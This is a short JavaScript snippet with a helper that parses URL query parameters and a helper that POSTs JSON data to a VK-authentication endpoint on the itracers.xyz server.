function parseGet(getHref){
	try {
		let arr = getHref.split("?")[1].split("&");
		let obj = {};
		for(let i = 0; i < arr.length; i++){
			arr[i] = arr[i].split("=");
			obj[arr[i][0]] = arr[i][1];
		}
		return obj;
	}catch {
		return 0;
	}
}
function send(data, collback){
	fetch("https://itracers.xyz:8443/api/vkauth", { 
	method: 'post', 
	headers: { 
		"Content-type": "application/json; charset=UTF-8" 
	},
	body: data
	})
	.then(collback)
	.catch(function (error) { 
	console.log('Request failed ', error ); 
	}); 
}